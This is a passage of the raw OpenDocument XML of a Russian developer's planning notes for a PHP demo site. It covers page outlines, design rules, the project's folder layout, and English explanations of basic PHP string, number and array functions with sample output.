      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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113" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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114" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759"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16" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T117"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118" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T119" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T120" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d"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21" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d"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22" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d"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23" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffc66d" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T124" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#383a42" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T125" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e45649" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T126" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#986801" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T127" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#50a14f" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T128" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="002b2cfd" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T129" style:family="text">
      <style:text-properties officeooo:rsid="00330b63"/>
    </style:style>
    <style:style style:name="T130" style:family="text">
      <style:text-properties officeooo:rsid="003819bf"/>
    </style:style>
    <style:style style:name="T131" style:family="text">
      <style:text-properties fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T132" style:family="text">
      <style:text-properties officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T133" style:family="text">
      <style:text-properties fo:color="#9876aa" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T134" style:family="text">
      <style:text-properties fo:color="#9876aa" officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T135" style:family="text">
      <style:text-properties fo:color="#9876aa" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T136" style:family="text">
      <style:text-properties fo:color="#9876aa" style:font-name="DejaVu Sans Mono" fo:font-style="italic" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T137" style:family="text">
      <style:text-properties fo:color="#6a8759" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T138" style:family="text">
      <style:text-properties fo:color="#6a8759" officeooo:rsid="00409c94" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T139" style:family="text">
      <style:text-properties fo:color="#6a8759" officeooo:rsid="0046416a" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T140" style:family="text">
      <style:text-properties fo:color="#6a8759" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T141" style:family="text">
      <style:text-properties fo:color="#cc7832" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T142" style:family="text">
      <style:text-properties fo:color="#cc7832" officeooo:rsid="003d34eb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T143" style:family="text">
      <style:text-properties fo:color="#cc7832" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T144" style:family="text">
      <style:text-properties fo:color="#cc7832" style:font-name="DejaVu Sans Mono" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T145" style:family="text">
      <style:text-properties fo:color="#cc7832" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T146" style:family="text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T147" style:family="text">
      <style:text-properties fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T148" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T149" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T150" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T151" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T152" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T153" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T154" style:family="text">
      <style:text-properties fo:color="#888a85" fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T155" style:family="text">
      <style:text-properties fo:color="#888a85" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T156" style:family="text">
      <style:text-properties fo:color="#cc0000" fo:font-size="14pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T157" style:family="text">
      <style:text-properties fo:color="#cc0000" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T158" style:family="text">
      <style:text-properties officeooo:rsid="003ad1eb"/>
    </style:style>
    <style:style style:name="T159" style:family="text">
      <style:text-properties officeooo:rsid="003eb51c"/>
    </style:style>
    <style:style style:name="T160" style:family="text">
      <style:text-properties officeooo:rsid="003f9523"/>
    </style:style>
    <style:style style:name="T161" style:family="text">
      <style:text-properties fo:color="#6897bb" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T162" style:family="text">
      <style:text-properties fo:color="#6897bb" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T163" style:family="text">
      <style:text-properties officeooo:rsid="00409c94"/>
    </style:style>
    <style:style style:name="T164" style:family="text">
      <style:text-properties fo:color="#4e9a06" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T165" style:family="text">
      <style:text-properties officeooo:rsid="00423cc4"/>
    </style:style>
    <style:style style:name="T166" style:family="text">
      <style:text-properties officeooo:rsid="00458729"/>
    </style:style>
    <style:style style:name="T167" style:family="text">
      <style:text-properties style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="T168" style:family="text">
      <style:text-properties style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T169" style:family="text">
      <style:text-properties officeooo:rsid="00482be4"/>
    </style:style>
    <style:style style:name="T170" style:family="text">
      <style:text-properties officeooo:rsid="004a1d91"/>
    </style:style>
    <style:style style:name="T171" style:family="text">
      <style:text-properties officeooo:rsid="004ec2bc"/>
    </style:style>
    <style:style style:name="T172" style:family="text">
      <style:text-properties officeooo:rsid="0055528d"/>
    </style:style>
    <style:style style:name="T173" style:family="text">
      <style:text-properties officeooo:rsid="005c20fe"/>
    </style:style>
    <style:style style:name="T174" style:family="text">
      <style:text-properties officeooo:rsid="005dbac4"/>
    </style:style>
    <style:style style:name="T175" style:family="text">
      <style:text-properties officeooo:rsid="00611894"/>
    </style:style>
    <style:style style:name="T176" style:family="text">
      <style:text-properties fo:color="#808080" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T177" style:family="text">
      <style:text-properties fo:color="#808080" style:font-name="DejaVu Sans Mono" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T178" style:family="text">
      <style:text-properties fo:color="#ffc66d" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T179" style:family="text">
      <style:text-properties officeooo:rsid="009d6c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mo</text:p>
      <text:p text:style-name="P1">Наб<text:span text:style-name="T175">р</text:span>оски, идеи, заметки по архитектуре стилю, контенту.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Разбиение базы демонстрируемых знаний по страницам</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T27">0</text:span>. <text:span text:style-name="T9">Главная страница</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">Демонстрация</text:span> <text:span text:style-name="T27">вывода контента из бд по принципу MVC и поисковика по сайту.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T27">о проекте и контакты</text:span>. </text:p>
      <text:p text:style-name="P5">1. <text:span text:style-name="T3">Работа с данными простых типов</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Демонстрация</text:span> встроенных удобных функций работы со строками, массивами и числами.</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Текст</text:span> о пользе и правильности использования встроенных функций и существующих решений в целом. </text:p>
      <text:p text:style-name="P18">Вставки<text:span text:style-name="T10"> этих самых функций и сравнение с авторски написанным ручным кодом.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T22">2</text:span>. <text:span text:style-name="T3">Работа со своими функциями</text:span></text:p>
      <text:p text:style-name="P5"><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5"><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18">Вставки<text:span text:style-name="T10"> этих самых функций.</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T22">3</text:span>. <text:span text:style-name="T3">Работа с </text:span><text:span text:style-name="T4">формами</text:span></text:p>
      <text:p text:style-name="P6"><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6"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T22">об экранировании, способах защиты от XSS через обработку форм</text:span>. </text:p>
      <text:p text:style-name="P19">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7"><text:span text:style-name="T23">4</text:span>. <text:span text:style-name="T3">Работа с </text:span><text:span text:style-name="T5">БД через ПДО</text:span></text:p>
      <text:p text:style-name="P7"><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7"><text:span text:style-name="T1">Текст</text:span> <text:span text:style-name="T22">об экранировании, способах защиты от XSS через обработку форм,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20"><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8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T24">5</text:span>. <text:span text:style-name="T6">Оптимизация и логирование</text:span></text:p>
      <text:p text:style-name="P8"><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8"><text:span text:style-name="T1">Текст</text:span> <text:s/>- <text:span text:style-name="T25">контент внешнего сайта ruhighload.com и рассказ о том, зачем нужно логирование.</text:span></text:p>
      <text:p text:style-name="P21">Вставки<text:span text:style-name="T10"> </text:span><text:span text:style-name="T13">функций parse_ini_file, set_ini, error_log</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T25">6</text:span>. <text:span text:style-name="T7">Принцип MVC</text:span></text:p>
      <text:p text:style-name="P9"><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9"><text:span text:style-name="T1">Текст</text:span> <text:s/><text:span text:style-name="T25">о концепции mvc и принципе работы шаблонизатора.</text:span></text:p>
      <text:p text:style-name="P22"><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10"><text:span text:style-name="T179">7</text:span>. <text:span text:style-name="T8">Типы данных в mysql</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Демонстрация</text:span> <text:s/><text:span text:style-name="T26">контента ruhighload, вывод таблицы по пользовательскому запросу</text:span></text:p>
      <text:p text:style-name="P10"><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23"><text:span text:style-name="T23">Вставки</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T14">содержимого БД, SQL запросов.</text:span></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P25"><text:span text:style-name="T14">О</text:span><text:span text:style-name="T10">сновные правила дизайна сайта.</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T10">1.</text:span>ПРОСТОТА<text:span text:style-name="T10"> — </text:span><text:span text:style-name="T15">малое количество </text:span></text:p>
      <text:list xml:id="list8573412451177692277" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P90">элементов html</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P91">контента</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P91">границ, кнопок, форм, изображений</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P91">демонстрируемых технологий</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P27">2.<text:span text:style-name="T1">Одностильность</text:span> — придерживание одного стиля относительно</text:p>
      <text:list xml:id="list6575519857754620055" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P92">набора цветов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92">набора шрифтов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:soft-page-break/>размеров элементов</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92">строения скелета страницы</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P27">3.<text:span text:style-name="T1">Лаконичность</text:span> — одна цветовая гамма на всём сайте (тёмно-серый, светло-серый, несколько бросских цветов)</text:p>
      <text:p text:style-name="P27">4.Минимальная высота страницы — по размеру монитора и ширина — почти на максимум.</text:p>
      <text:p text:style-name="P28">5.Весь контент сайта хранится и извлекается из БД по принципу MVC</text:p>
      <text:p text:style-name="P28">6.<text:span text:style-name="T1">Элементы дизайна</text:span> - </text:p>
      <text:list xml:id="list9151644519624710631" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P93">небольшие непричёмные картинки с целью разбавки контента — одна-две на страницу</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93">Вставки кода, выделенные как на благородных ресурсах.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93">Hover, изменяющий цвет ссылки и небросское выделение ссылок в целом.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P38">Архитектура проекта</text:p>
      <text:p text:style-name="P57">demo</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">vendor</text:span></text:p>
      <text:p text:style-name="P57"/>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57"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">design</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">images</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">css</text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="Standard">&gt;<text:span text:style-name="T3">var</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;<text:span text:style-name="T3">log</text:span></text:p>
      <text:p text:style-name="Standard">&gt;&gt;&gt;dev.log</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P58">&gt;<text:span text:style-name="T3">tpl</text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">&gt;composer.json</text:p>
      <text:p text:style-name="Standard">&gt;composer.lock</text:p>
      <text:p text:style-name="Standard">&gt;.gitignore</text:p>
      <text:p text:style-name="P59">&gt;.env</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P37">Подробности каждой страницы</text:p>
      <text:p text:style-name="P39">0.Главная</text:p>
      <text:p text:style-name="P31"><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29"><text:tab/><text:span text:style-name="T28">Основными ресурсами, на базе которых я формировал свой багаж знаний на данный момент являются </text:span></text:p>
      <text:p text:style-name="P29"><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34"><text:bookmark-start text:name="__DdeLink__400_639857035"/>Дэвид Скляр, Адам Трахтенберг «PHP Cookbook 3 издание»<text:bookmark-end text:name="__DdeLink__400_639857035"/> (системматизация знаний),</text:p>
      <text:p text:style-name="P35"><text:bookmark-start text:name="__DdeLink__403_639857035"/>https://habrahabr.ru/<text:bookmark-end text:name="__DdeLink__403_639857035"/> (важные концепции простыми словами, полезные статьи), </text:p>
      <text:p text:style-name="P32"><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30"><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33">Контакты </text:p>
      <text:p text:style-name="P33"><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33"><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6"><text:bookmark-start text:name="__DdeLink__415_639857035"/><text:a xlink:type="simple" xlink:href="https://www.facebook.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.facebook.com/</text:a><text:bookmark-end text:name="__DdeLink__415_639857035"/></text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P13"><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128">(</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40">Basic sources of my knowledge in PHP language were</text:p>
      <text:p text:style-name="P46">1.Base types processing</text:p>
      <text:p text:style-name="P41">Сделать простую структуру шаблона:</text:p>
      <text:p text:style-name="P41">текст-вставка <text:span text:style-name="T171">кода-вставка вывода</text:span>-заключение, благодаря которой будет удавать безумно легко расширять страницу обзором новых функций.</text:p>
      <text:p text:style-name="P42"><text:tab/><text:bookmark-start text:name="__DdeLink__485_1892330286"/><text:bookmark-start text:name="__DdeLink__488_1892330286"/><text:span text:style-name="T129">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129">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43"><text:tab/><text:bookmark-start text:name="__DdeLink__503_1892330286"/><text:span text:style-name="T130">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47"><text:span text:style-name="T79"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__501_1892330286"/><text:span text:style-name="T135">$sentence </text:span><text:span text:style-name="T146">= </text:span><text:span text:style-name="T140">"Hello, great big white world!"</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$words </text:span><text:span text:style-name="T131">= explode(</text:span><text:span text:style-name="T137">" "</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T133">$sentence</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$words</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span><text:bookmark-end text:name="__DdeLink__501_1892330286"/></text:p>
      <text:p text:style-name="P76"><text:bookmark-start text:name="__DdeLink__507_1892330286"/><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T147">(size=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">0 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'Hello,'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=6)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">1 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'great'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">2 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'big'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=3)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">3 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'white'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P87"><text:s text:c="2"/><text:span text:style-name="T151">4 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'world!'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=6)</text:span><text:bookmark-end text:name="__DdeLink__507_1892330286"/></text:p>
      <text:p text:style-name="P44"><text:tab/><text:bookmark-start text:name="__DdeLink__505_1892330286"/><text:span text:style-name="T172">As you can see it's really simple and it really works.</text:span> Also you can pass another delimiter-symbol or even delimiter-string if you want. For example in case you are going to explode a CSV string <text:span text:style-name="T158">you can transmit a comma or a comma with a space as a parameter. Also there are built-in functions to work with CSV :)</text:span><text:bookmark-end text:name="__DdeLink__505_1892330286"/></text:p>
      <text:p text:style-name="P45"><text:tab/><text:bookmark-start text:name="__DdeLink__522_1892330286"/><text:span text:style-name="T158">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48"><text:span text:style-name="T80"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__518_1892330286"/><text:span text:style-name="T135">$sentence </text:span><text:span text:style-name="T146">= </text:span><text:span text:style-name="T140">"Hello, great big white world!"</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$words </text:span><text:span text:style-name="T131">= preg_split(</text:span><text:span text:style-name="T137">"/[\s,.!?]+/"</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T133">$sentence</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$words</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span><text:bookmark-end text:name="__DdeLink__518_1892330286"/></text:p>
      <text:p text:style-name="P77"><text:bookmark-start text:name="__DdeLink__520_1892330286"/><text:span text:style-name="T149">array</text:span><text:span text:style-name="T147"> (size=6)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">0 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'Hello'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">1 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'great'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">2 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'big'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=3)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">3 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'white'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T151">4 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">'world'</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=5)</text:span></text:p>
      <text:p text:style-name="P87"><text:s text:c="2"/><text:span text:style-name="T151">5 </text:span><text:span text:style-name="T154">=&gt;</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T156">''</text:span><text:span text:style-name="T151"> </text:span><text:span text:style-name="T152">(length=0)</text:span><text:bookmark-end text:name="__DdeLink__520_1892330286"/></text:p>
      <text:p text:style-name="P50"><text:tab/><text:bookmark-start text:name="__DdeLink__524_1892330286"/><text:span text:style-name="T173">p</text:span>reg_split function breaks the string into words basing on the regular expression but not on a <text:span text:style-name="T173">simple string-delimiter. That's why you are getting nice clear array. Except the last empty string but I</text:span> believe this problem is much more pleasant than the previous one :) Should notice that <text:span text:style-name="T159">for the </text:span><text:soft-page-break/><text:span text:style-name="T159">flexibility of this way you pay with your performance because regular expressions always work slower.</text:span><text:bookmark-end text:name="__DdeLink__524_1892330286"/></text:p>
      <text:p text:style-name="P49"><text:tab/><text:bookmark-start text:name="__DdeLink__533_1892330286"/><text:span text:style-name="T160">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63"><text:bookmark-start text:name="__DdeLink__536_1892330286"/><text:span text:style-name="T134">$hexValue </text:span><text:span text:style-name="T132">= </text:span><text:span text:style-name="T137">'a</text:span><text:span text:style-name="T139">1</text:span><text:span text:style-name="T137">'</text:span><text:span text:style-name="T142">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T131">base_convert(</text:span><text:span text:style-name="T133">$hexValue</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">16</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">10</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span><text:bookmark-end text:name="__DdeLink__536_1892330286"/></text:p>
      <text:p text:style-name="P71"><text:bookmark-start text:name="__DdeLink__538_1892330286"/>161<text:bookmark-end text:name="__DdeLink__538_1892330286"/></text:p>
      <text:p text:style-name="P51"><text:tab/><text:bookmark-start text:name="__DdeLink__540_1892330286"/>base_convert function converts value of any to any system. Also working not only with usual systems like 2, 3, 4, 8, 16, 32. I dare say that more local solutions like hex2bin, hexdec, octdec <text:span text:style-name="T163">(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51"><text:tab/><text:bookmark-start text:name="__DdeLink__552_1892330286"/><text:span text:style-name="T163">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62"><text:bookmark-start text:name="__DdeLink__554_1892330286"/><text:span text:style-name="T133">$decade </text:span><text:span text:style-name="T131">= range(</text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">10</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$decade</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$alphabetFirstHalf </text:span><text:span text:style-name="T131">= range(</text:span><text:span text:style-name="T137">'a'</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T137">'</text:span><text:span text:style-name="T138">m</text:span><text:span text:style-name="T137">'</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$alphabetFirstHalf</text:span><text:bookmark-end text:name="__DdeLink__554_1892330286"/></text:p>
      <text:p text:style-name="P72"><text:bookmark-start text:name="__DdeLink__556_1892330286"/><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T147">(size=10)</text:span></text:p>
